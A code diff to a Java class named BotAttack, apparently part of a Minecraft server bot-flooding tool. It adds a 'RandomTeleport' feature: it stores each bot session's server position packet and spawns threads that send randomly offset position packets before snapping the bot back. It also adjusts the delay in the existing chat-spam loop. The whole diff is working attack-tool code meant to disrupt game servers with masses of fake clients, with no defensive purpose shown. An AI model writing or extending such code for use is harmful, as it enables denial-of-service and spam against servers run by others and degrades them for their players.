@@ -42,6 +42,7 @@ public class BotAttack extends IAttack {
     public static int rejoin = 0;
     public static int clickVerifies = 0;
     public static List<String> alivePlayers = new ArrayList<>();
+    public static HashMap<Session, ServerPlayerPositionRotationPacket> positionPacket = new HashMap<>();
     protected boolean attack_motdbefore;
     protected boolean attack_tab;
     protected Map<String, String> modList;
@@ -80,9 +81,23 @@ public class BotAttack extends IAttack {
                         if (c.getSession().hasFlag("login")) {
                             if (ConfigUtil.ChatSpam) {
                                 c.getSession().send(new ClientChatPacket(getRandMessage(clientName.get(c))));
+                                OtherUtils.doSleep(ConfigUtil.ChatDelay);
                             }
 
-                            OtherUtils.doSleep(ConfigUtil.ChatDelay);
+                            if (ConfigUtil.RandomTeleport) {
+                                ServerPlayerPositionRotationPacket positionRotationPacket = positionPacket.get(c.getSession());
+                                if (c.getSession().isConnected() && positionRotationPacket != null) {
+                                    new Thread(() -> {
+                                        try {
+                                            cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.MultiVersionPacket.sendPosPacket(c.getSession(), positionRotationPacket.getX() + OtherUtils.getRandomInt(-10, 10), positionRotationPacket.getY() + OtherUtils.getRandomInt(2, 8), positionRotationPacket.getZ() + OtherUtils.getRandomInt(-10, 10), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
+                                            Thread.sleep(500);
+                                            cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.MultiVersionPacket.sendPosPacket(c.getSession(), positionRotationPacket.getX(), positionRotationPacket.getY(), positionRotationPacket.getZ(), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
+                                        } catch (InterruptedException e) {
+                                            throw new RuntimeException(e);
+                                        }
+                                    }).start();
+                                }
+                            }
                         } else if (c.getSession().hasFlag("join")) {
                             if (ConfigUtil.RegisterAndLogin) {
                                 for (String cmd:ConfigUtil.RegisterCommands) {
@@ -399,6 +414,7 @@ public class BotAttack extends IAttack {
                 MultiVersionPacket.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
                 session.send(new ClientPlayerMovementPacket(true));
                 MultiVersionPacket.sendClientTeleportConfirmPacket(session, packet);
+                positionPacket.put(session, packet);
             } catch (Exception ignored) {}
 
         } else if (recvPacket instanceof ServerChatPacket) {
